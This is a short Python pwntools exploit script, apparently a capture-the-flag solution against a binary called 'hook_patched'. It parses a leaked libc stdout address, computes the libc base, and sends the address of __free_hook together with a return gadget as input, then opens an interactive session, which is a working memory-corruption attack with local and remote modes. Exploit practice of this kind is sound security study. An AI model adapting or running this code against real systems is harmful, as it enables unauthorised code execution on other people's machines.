from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './hook_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
#context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True
context.arch = elf.arch

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
libc = ELF('libc.so.6')
p.recvuntil(b'stdout: ')
leak = int(p.recvuntil(b'\n', drop=True), 16)
info('leak: ' + hex(leak))
libc.address = leak - libc.symbols['_IO_2_1_stdout_']
info('libc.address: ' + hex(libc.address))
free_hook = libc.symbols['__free_hook']
ret_gadget = 0x0000000000400751
p.sendlineafter(b'Size: ', b'20')
p.sendlineafter(b'Data: ', p64(free_hook)+p64(ret_gadget))
p.interactive()